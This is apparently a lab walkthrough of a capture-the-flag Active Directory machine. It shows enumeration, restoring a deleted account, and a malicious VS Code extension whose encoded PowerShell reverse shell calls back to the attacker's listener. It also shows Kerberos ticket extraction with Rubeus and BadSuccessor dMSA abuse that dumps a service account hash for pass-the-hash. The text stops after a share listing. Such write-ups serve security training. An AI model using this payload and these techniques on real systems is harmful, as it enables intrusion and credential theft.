As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!
### Nmap
```
nmap -sV -sC -vv 10.129.25.169

---OUTPUT---
Nmap scan report for 10.129.25.169
Host is up, received echo-reply ttl 127 (0.12s latency).
Scanned at 2026-06-14 13:23:13 EDT for 99s
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           REASON          VERSION
53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-15 00:23:45Z)
135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?     syn-ack ttl 127
464/tcp  open  kpasswd5?         syn-ack ttl 127
593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?          syn-ack ttl 127
3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
5985/tcp open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 15244/tcp): CLEAN (Timeout)
|   Check 2 (port 30767/tcp): CLEAN (Timeout)
|   Check 3 (port 62253/udp): CLEAN (Timeout)
|   Check 4 (port 63616/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-06-15T00:23:57
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

### SMBClient
```
nxc smb checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --shares


---OUTPUT---
SMB         10.129.25.169   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.25.169   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.25.169   445    DC01             [*] Enumerated shares
SMB         10.129.25.169   445    DC01             Share           Permissions     Remark
SMB         10.129.25.169   445    DC01             -----           -----------     ------
SMB         10.129.25.169   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.25.169   445    DC01             C$                              Default share
SMB         10.129.25.169   445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                           
SMB         10.129.25.169   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.25.169   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.25.169   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.25.169   445    DC01             VMBackups                       

```

- Using nxc I get all the users:
```
nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users

---OUTPUT---
LDAP        10.129.25.169   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.25.169   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.25.169   389    DC01             [*] Enumerated 17 domain users: checkpoint.htb
LDAP        10.129.25.169   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description- 
LDAP        10.129.25.169   389    DC01             Administrator                 2026-05-09 12:16:34 0        Built-in account for administering the computer/domain                                                                                     
LDAP        10.129.25.169   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                                   
LDAP        10.129.25.169   389    DC01             krbtgt                        2026-05-09 04:41:01 0        Key Distribution Center Service Account                                                                                                    
LDAP        10.129.25.169   389    DC01             alex.turner                   2026-05-09 05:00:08 0                      
LDAP        10.129.25.169   389    DC01             ryan.brooks                   2026-05-10 09:46:18 0                      
LDAP        10.129.25.169   389    DC01             svc_deploy                    2026-05-09 05:01:19 0        Deployment service account                                                                                                                 
LDAP        10.129.25.169   389    DC01             james.harper                  2026-05-09 05:02:53 0                      
LDAP        10.129.25.169   389    DC01             sarah.mitchell                2026-05-09 05:02:58 0                      
LDAP        10.129.25.169   389    DC01             emily.carter                  2026-05-09 05:03:05 0                      
LDAP        10.129.25.169   389    DC01             david.reynolds                2026-05-09 05:03:11 0                      
LDAP        10.129.25.169   389    DC01             jessica.coleman               2026-05-09 05:03:15 0                      
LDAP        10.129.25.169   389    DC01             lauren.flores                 2026-05-09 05:03:21 0                      
LDAP        10.129.25.169   389    DC01             michael.torres                2026-05-09 05:03:28 0                      
LDAP        10.129.25.169   389    DC01             kevin.patterson               2026-05-09 05:03:33 0                      
LDAP        10.129.25.169   389    DC01             brian.jenkins                 2026-05-09 05:03:37 0                      
LDAP        10.129.25.169   389    DC01             megan.perry                   2026-05-09 05:03:42 0                      
LDAP        10.129.25.169   389    DC01             max.palmer                    2026-05-25 21:25:15 0
```

- Using bloodyAD I check the writeable permissions of our user. Note that the inbuilt bloodyAD was not the latest version and did not identify the intended path and to get it to work I had to install bloodyAD via pip and use that tool isntead:
```
pipx install bloodyAD

bloodyAD --host 10.129.28.55 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable  

---OUTPUT---            

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

- We see that we have write permissions on a user Mark Davies which has been deleted.
- Using bloodyAD we can restore it as we have permissions on this user:
```
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'

---OUTPUT---
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```
- Using nxc I find that the same password for our initial user works fo rthis account. Furthermore Mark Davies has write permissions on the VSIX share `DevDrop`
```
nxc smb 10.129.28.55 -u 'Mark.Davies' -p 'Checkpoint2024!' --shares

---OUTPUT---
SMB         10.129.28.55    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.28.55    445    DC01             [+] checkpoint.htb\Mark.Davies:Checkpoint2024! 
SMB         10.129.28.55    445    DC01             [*] Enumerated shares
SMB         10.129.28.55    445    DC01             Share           Permissions     Remark
SMB         10.129.28.55    445    DC01             -----           -----------     ------
SMB         10.129.28.55    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.28.55    445    DC01             C$                              Default share
SMB         10.129.28.55    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                           
SMB         10.129.28.55    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.28.55    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.28.55    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.28.55    445    DC01             VMBackups                   
```

### VSIX exploit
- Vsix files hold a specific structure and their extensions can be exploitable. A VSIX file is basically a zip file where there is a `packages.js`on which defines the name of the extension and calls it
- The basic structure of the VSIX is :
```
tree ../evil-ext 

---OUTPUT---
../evil-ext
├── [Content_Types].xml
├── evil.vsix
└── extension
    ├── extension.js
    └── package.json
```
To follow this I create a folder `evil-ext`, and create a file `{Content-Types].xml` and a folder `extension`. Inside the `extension` folder I create the files `package.json` and `extension.js`
```
mkdir -p evil-ext/extension
cd evil-ext

vi [Content-Types].xml     #Enter basic code here
cd extension
vi package,json            # Enter code calling extension.js
vi extension.js            # Enter payload here
```
- The contents of the files are:
- `[Content-types].xml`
```
cat ../evil-ext/\[Content_Types\].xml

---OUTPUT---
<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
</Types>
```

- `extension/package.json`
```
cat package.json          

---OUTPUT---
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```
- `extension/extension.js`
```
cat extension/extension.js 

---OUTPUT---
const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOQAiACwAOQA5ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=');
}
exports.deactivate = function() {}
```

- Finally we zip the contents into a vsix:
```
zip -r evil.vsix '[Content_Types].xml' extension/                                                            
---OUTPUT---
  adding: [Content_Types].xml (deflated 35%)
  adding: extension/ (stored 0%)
  adding: extension/extension.js (deflated 53%)
  adding: extension/package.json (deflated 28%)
```

- Finally I send it to the `DevDrop` share and have my netcat listener 
```
smbclient //10.129.28.55/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"

---OUTPUT---
putting file evil.vsix as \evil.vsix (11.7 kB/s) (average 11.7 kB/s)
```

- I grab a shell on my netcat listener:
```
 nc -lvnp 9999                                                               
listening on [any] 9999 ...
connect to [10.10.16.9] from (UNKNOWN) [10.129.28.55] 58333

PS C:\Program Files\Microsoft VS Code> whoami                                     
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> hostname
DC01
```
![[Pasted image 20260617060502.png]]

- I get a session as user `ryan.brooks` and grab the user flag:
![[Pasted image 20260617060555.png]]

## Lateral Movement
- Looking around I find that this user has dmsa permissions:
- Looking for interesting OU;s
```
dsquery ou -limit 0

---OUTPUT---
"OU=Domain Controllers,DC=checkpoint,DC=htb"
"OU=Employees,DC=checkpoint,DC=htb"
"OU=ServiceAccounts,DC=checkpoint,DC=htb"
"OU=DMSAHolder,DC=checkpoint,DC=htb"
"OU=IT,OU=Employees,DC=checkpoint,DC=htb"
"OU=Finance,OU=Employees,DC=checkpoint,DC=htb"
"OU=HR,OU=Employees,DC=checkpoint,DC=htb"
"OU=Engineering,OU=Employees,DC=checkpoint,DC=htb"
```

- We see an intersting one `"OU=DMSAHolder,DC=checkpoint,DC=htb"`
- Checking rights in this OU
```
dsacls "OU=DMSAHolder,DC=checkpoint,DC=htb"

---RELEVANT-OUTPUT---
Owner: CHECKPOINT\Domain Admins
Group: CHECKPOINT\Domain Admins

Access list:
Allow CHECKPOINT\Domain Admins        FULL CONTROL
Allow CHECKPOINT\ryan.brooks          SPECIAL ACCESS
                                      CREATE CHILD
<SNIP>
The command completed successfully
```

- We see user `ryan.brooks` has `CREATE CHILD` property on this OU, This tells us we can exploit this by using the BadSuccessor exploit.
- For a quick route we can grab a ticket using Rubeus and then use bloody AD to create our dMSA account directly:
```
---RUBEUS-ON-TARGET---
.\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: OcRm6lBcO9Ezl3M77UtBn/we5dg+d0e5B8DQFxLyUgw=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu/jXsz3yB++LUmEwhn9POGstCI2jPZ9bgL2UL8W2LnYQuzdnD4ahd1P3lyfgDqjAzN0Zf/51sLkZY1Z4HFjkEJ6zxLv8pP9s9pPd8JLJDuqTeolV4OfSdEunvT+f72WJJsO2BW4ALA5r7gQKV6KwTLaFbyDVxxliAytT27apQvw9ZUSQifCITn7EyP6UFkBX+Wfy7tYsWhW56CGLD+R3F13lIei6kc8xxnZ/CrEIDleEFswsjB38xjUx09H5HfAURMXBaHICsH/CfmC4hUV4lil/LlUEYBg9IoK3XnsYTA78Qj6kBdWVn196+tEGAaR8KxujIIikwnXOkS//MjwwET3BctFh4/0qwrn3PzPSsxsrHigmeWHgaR6Ou2hsWvM+7qfhQIpx5G2ZHeDG2LRHUwmNf7M6b2IyO1K7xe6AoHVKG0HDPDKZwvxbhPa+aWtBd0atxstWtBwYwVvTsj7jYAupixxqLhUDRBh2vpEi+dOrdQrgF7eVBF80UVSvhgbW85jfsWZW/jKMD80pqkKru/ZcIHcAjK4HMJDnmBHQeHVEjGDM/MnUDwsRWUhTx57LhM1z+RHkgi6MliFjCqq9yxX6yvRU11gkTIj+5FuKOlvlduugEXcl8gBOENo74V7TF4TtBHy+bt9qURP156QwVZY/asz76QKEL9EAvoH3uJ6sjC43z3zzHfb4bSbBi/fZ5CGtaX181HqgjUZd1VAJvAnUFJjiNqqmN2QokBnAPejhRJBF4Ke7lyNyXnLDnxDd7/La2nzHW0ThE1U861AxCeafIwn/LkApc67zPcYJzNuKX4FFz0Ccn+0dwzvGkC1vygYGvT7EPdjFP138V/bLMguBGvmO5aV/M+KZDQW5esYCIqJB0lC3ff26ihpr8siNvok02D+T9NDIh4PZ4/kWGxjQgjQbUGRXyuh5NfQcvsa/zzwxYSswSX8FE/hCf4Xkx55cp+VDL0nFjaNgjSDavTMshEh4J4sEDiG9SEqavT8O1THOD16HcdSWvi61Wjnq2DZt9tHXevV4eHU0N5MSMVGPNlyKLLxXWY407uYixeAHs1oS1kKkh8O+NIljlsKVw8uxufZrvGZ4NW0uX6qnjQjBUdh9jcoIxAP52ili79XQZaBafKu8KT6AA+na8B4CvbVZfA6to8LidemjR0HlOQjJFDu9WyXB+49ULAQrDyUXfdu554rDDngJmuAjl5FdAsJz9Eh+YaOmgrSQ66959Jg4KBHsCdxOoxPsMsErpxNoPq5c9/wwd+TYuuuIO+PDx614p8aNvbqzMz1cxWRgvpGAOLAhb7SVWdG3suA7QceP+caWIAv+nqCaRMa8FrIVRAfFGdgigipEqZdfSFNQsXvIUsbaGeAJ9Ju2fSfU2yCg/fxdgvPcqnc2cEWpCa/91UMrvGujZXpVW45OunqWVyz14VsMNz/H4DS64TLSBv82DIKA5S0RfaigcsQ1sgD51j0yz+0AlKe7znKKtG8E4EGIRssYpCNtK5f00v1b2o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgOkzlPiZYy40I6PnqC6Er2VCKBwj/e0Xi8NyOCTcIUwmhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYxNjIyMDUwMFqmERgPMjAyNjA2MTcwODA1MDBapxEYDzIwMjYwNjIzMjIwNTAwWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
```

- I copy the base64 ticket and convert it to make it into a kirbi file.
```
echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu/jXsz3yB++LUmEwhn9POGstCI2jPZ9bgL2UL8W2LnYQuzdnD4ahd1P3lyfgDqjAzN0Zf/51sLkZY1Z4HFjkEJ6zxLv8pP9s9pPd8JLJDuqTeolV4OfSdEunvT+f72WJJsO2BW4ALA5r7gQKV6KwTLaFbyDVxxliAytT27apQvw9ZUSQifCITn7EyP6UFkBX+Wfy7tYsWhW56CGLD+R3F13lIei6kc8xxnZ/CrEIDleEFswsjB38xjUx09H5HfAURMXBaHICsH/CfmC4hUV4lil/LlUEYBg9IoK3XnsYTA78Qj6kBdWVn196+tEGAaR8KxujIIikwnXOkS//MjwwET3BctFh4/0qwrn3PzPSsxsrHigmeWHgaR6Ou2hsWvM+7qfhQIpx5G2ZHeDG2LRHUwmNf7M6b2IyO1K7xe6AoHVKG0HDPDKZwvxbhPa+aWtBd0atxstWtBwYwVvTsj7jYAupixxqLhUDRBh2vpEi+dOrdQrgF7eVBF80UVSvhgbW85jfsWZW/jKMD80pqkKru/ZcIHcAjK4HMJDnmBHQeHVEjGDM/MnUDwsRWUhTx57LhM1z+RHkgi6MliFjCqq9yxX6yvRU11gkTIj+5FuKOlvlduugEXcl8gBOENo74V7TF4TtBHy+bt9qURP156QwVZY/asz76QKEL9EAvoH3uJ6sjC43z3zzHfb4bSbBi/fZ5CGtaX181HqgjUZd1VAJvAnUFJjiNqqmN2QokBnAPejhRJBF4Ke7lyNyXnLDnxDd7/La2nzHW0ThE1U861AxCeafIwn/LkApc67zPcYJzNuKX4FFz0Ccn+0dwzvGkC1vygYGvT7EPdjFP138V/bLMguBGvmO5aV/M+KZDQW5esYCIqJB0lC3ff26ihpr8siNvok02D+T9NDIh4PZ4/kWGxjQgjQbUGRXyuh5NfQcvsa/zzwxYSswSX8FE/hCf4Xkx55cp+VDL0nFjaNgjSDavTMshEh4J4sEDiG9SEqavT8O1THOD16HcdSWvi61Wjnq2DZt9tHXevV4eHU0N5MSMVGPNlyKLLxXWY407uYixeAHs1oS1kKkh8O+NIljlsKVw8uxufZrvGZ4NW0uX6qnjQjBUdh9jcoIxAP52ili79XQZaBafKu8KT6AA+na8B4CvbVZfA6to8LidemjR0HlOQjJFDu9WyXB+49ULAQrDyUXfdu554rDDngJmuAjl5FdAsJz9Eh+YaOmgrSQ66959Jg4KBHsCdxOoxPsMsErpxNoPq5c9/wwd+TYuuuIO+PDx614p8aNvbqzMz1cxWRgvpGAOLAhb7SVWdG3suA7QceP+caWIAv+nqCaRMa8FrIVRAfFGdgigipEqZdfSFNQsXvIUsbaGeAJ9Ju2fSfU2yCg/fxdgvPcqnc2cEWpCa/91UMrvGujZXpVW45OunqWVyz14VsMNz/H4DS64TLSBv82DIKA5S0RfaigcsQ1sgD51j0yz+0AlKe7znKKtG8E4EGIRssYpCNtK5f00v1b2o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgOkzlPiZYy40I6PnqC6Er2VCKBwj/e0Xi8NyOCTcIUwmhEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYxNjIyMDUwMFqmERgPMjAyNjA2MTcwODA1MDBapxEYDzIwMjYwNjIzMjIwNTAwWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=" | base64 -d > ryan.kirbi
```

- Finaly I convert the kirbi file to a ccache so we can use the ticket locally:
```
impacket-ticketConverter ryan.kirbi ryan.ccache
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

- I export the ticket and finally use bloodyAD to create our dMSA account exploiting badSuccessor abuse:
```
export KRB5CCNAME=ryan.ccache

bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'

---OUTPUT---
Clock skew detected. Adjusting local time by 6:59:59.706356. Retrying operation.
[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
Clock skew detected. Adjusting local time by 6:59:59.805645. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : evil-dmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-16 22:06:11+00:00
EndTime      : 2026-06-17 08:05:00+00:00
RenewTill    : 2026-06-23 22:05:00+00:00
Flags        : enc-pa-rep, pre-authent, forwardable, forwarded, renewable
Keytype      : 18
Key          : u7xiPABOWfwyowwJ99nLKi1Xa3DRPqq4VA9g8GnB0I8=
EncodedKirbi : 

    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
    Q0tQT0lOVC5IVEI=
[+] dMSA TGT stored in ccache file evil-dmsa_f8.ccache

dMSA current keys found in TGS:
AES256: e3d23b60dc81697f73e61bcee444f3986e80d5d95c97035672a254186876869d
AES128: c194b9e2b92badff8bad86808971eae0
RC4: bcffd068cde6897fbe298d739cd17ef3

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

- We see previous key RC4 hash which we can use.
- Using this I can access another SMB share `VMBackups`
```
nxc smb 10.129.28.55 -u SVC_DEPLOY -H e16081eb077aca74bdbf8af12af43ac9 --shares
SMB         10.129.28.55    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.28.55    445    DC01             [+] checkpoint.htb\SVC_DEPLOY:e16081eb077aca74bdbf8af12af43ac9 
SMB         10.129.28.55    445    DC01             [*] Enumerated shares
SMB         10.129.28.55    445    DC01             Share           Permissions     Remark
SMB         10.129.28.55    445    DC01             -----           -----------     ------
SMB         10.129.28.55    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.28.55    445    DC01             C$                              Default share
SMB         10.129.28.55    445    DC01             DevDrop                         VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0                                                                           
SMB         10.129.28.55    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.28.55    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.28.55    445    DC01             SYSVOL          READ            Logon server share 
